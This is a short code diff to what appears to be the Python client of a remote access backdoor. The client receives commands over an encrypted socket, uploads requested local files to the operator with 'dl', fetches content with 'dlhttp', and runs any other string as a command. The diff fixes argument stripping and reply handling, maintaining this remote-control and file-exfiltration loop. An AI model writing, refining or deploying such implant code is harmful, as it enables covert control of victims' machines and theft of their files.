@@ -21,6 +21,7 @@ def upload(sock, fn):
     d = f.read()
     f.close()
     Send(sock, cipher, d, fn)
+    ret = ''
   except Exception as e:
     return str(e) + ' ⚠️'
 
@@ -80,9 +81,9 @@ while True:
 
     if type(data) == str:
       if data.startswith('dl '):
-        ret = upload(sock, data[3:])
+        ret = upload(sock, data[3:].strip())
       elif data.startswith('dlhttp '):
-        ret = dlhttp(sock, data[7:])
+        ret = dlhttp(sock, data[7:].strip())
       else:
         ret = run(data)
     else:
@@ -94,4 +95,5 @@ while True:
       except Exception as e:
         ret = str(e) + ' ⚠️'
 
-    Send(sock, cipher, res(ret))
+    if ret:
+      Send(sock, cipher, res(ret))
